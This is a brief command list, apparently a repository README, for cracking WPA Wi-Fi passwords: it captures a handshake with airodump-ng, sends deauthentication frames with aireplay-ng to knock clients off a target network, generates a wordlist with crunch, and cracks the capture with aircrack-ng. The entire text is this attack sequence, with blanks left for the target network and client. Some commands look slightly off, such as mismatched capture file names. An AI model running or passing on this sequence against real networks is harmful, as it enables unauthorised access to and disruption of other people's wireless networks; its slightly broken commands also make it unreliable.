# passwerd-craking-.
#Capturing Handshake airodump-ng start wlan0 airodump-ng --bssid__--channel __ --write wpa_handshake wlan0 aireplay-ng --deauth 13 -a __ -c___ wlan0  #Preparing wordlist crunch 6 8 abc12 -o pass.txt cat pass.txt # Actual Cracking with wordlist aircrack-ng wpa_abc-01.cap -w pass.txt
